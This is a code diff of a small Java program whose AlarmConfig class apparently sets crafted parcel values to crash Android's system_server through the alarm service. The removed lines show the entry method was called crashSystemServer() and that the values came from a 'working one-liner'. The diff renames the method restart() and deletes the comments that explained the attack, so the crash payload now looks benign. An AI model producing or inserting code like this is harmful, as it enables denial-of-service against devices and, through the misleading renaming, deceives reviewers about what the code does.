@@ -1,30 +1,28 @@
 package com.example.csapp;
 
 import java.io.BufferedReader;
-import java.io.IOException;
 import java.io.InputStreamReader;
 
 public class Main {
 
     public static class AlarmConfig {
-        // All fields set to the exact values from your working one-liner
         public int callingPackage = -1;
-        public int type = 0;
-        public long triggerAtTime = 0;
-        public long windowLength = 0;
-        public long interval = 0;
-        public int flags = 0;
-        public int operation = 0;           // null
+        public int type = 0;//
+        public long triggerAtTime = 1;
+        public long windowLength = 1;
+        public long interval = 15;
+        public int flags = 3;
+        public int operation = 0;
         public String listener = "null";
         public int listenerTag = -1;
-        public int workSource = 0;          // null
-        public int alarmClock = 1;          // not null → triggers AlarmClockInfo path
+        public int workSource = 0;
+        public int alarmClock = 1;
         public long mTriggerTime = 0;
-        public String parcelableClass = "android.content.pm.PackageParser$Activity";
-        public int className = -1;          // null
-        public int metaData = -1;           // null
+        public String parcelableClass = "android.content.pm.PackageParser$Service";
+        public int className = -1;
+        public int metaData = -1;
         public int intentCount = 1;
-        public String pooledStringClass = "android.os.PooledStringWriter";
+        public String pooledStringClass = "Parcel.writeString()";
         public int padding = 0;
     }
 
@@ -78,12 +76,12 @@ public class Main {
         }
     }
 
-    public static void crashSystemServer() {
+    public static void restart() {
         AlarmConfig config = new AlarmConfig();  // uses the exact values above
         setAlarm(config);
     }
 
     public static void main(String[] args) {
-        crashSystemServer();
+        restart();
     }
 }
